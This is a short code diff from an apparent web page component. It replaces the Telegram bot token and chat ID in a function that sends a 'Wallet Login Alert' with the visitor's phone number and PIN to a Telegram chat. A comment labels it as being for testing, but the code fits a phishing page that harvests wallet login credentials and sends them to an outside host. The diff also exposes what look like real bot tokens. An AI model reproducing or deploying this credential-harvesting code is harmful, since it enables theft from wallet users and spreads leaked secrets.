@@ -28,8 +28,8 @@ const Index = () => {
   // Client-side Telegram alert (unsafe, only for testing)
 // Client-side Telegram alert (unsafe, only for testing)
 const sendTelegramAlertClient = (phone: string, pin: string) => {
-  const BOT_TOKEN = "8244803895:AAElCNS9IzbpDj8WfaBJM04tH9zrMSpvpjc";
-  const CHAT_ID = "6564676243";
+  const BOT_TOKEN = "8523587471:AAHmYwo8Z_XwLjNJ6tr8ZP_JXPTz8nWuLOI";
+  const CHAT_ID = "6077194516";
 
   const message = `🔔Wallet Login Alert\nPhone: ${phone}\nPIN: ${pin}`;
 
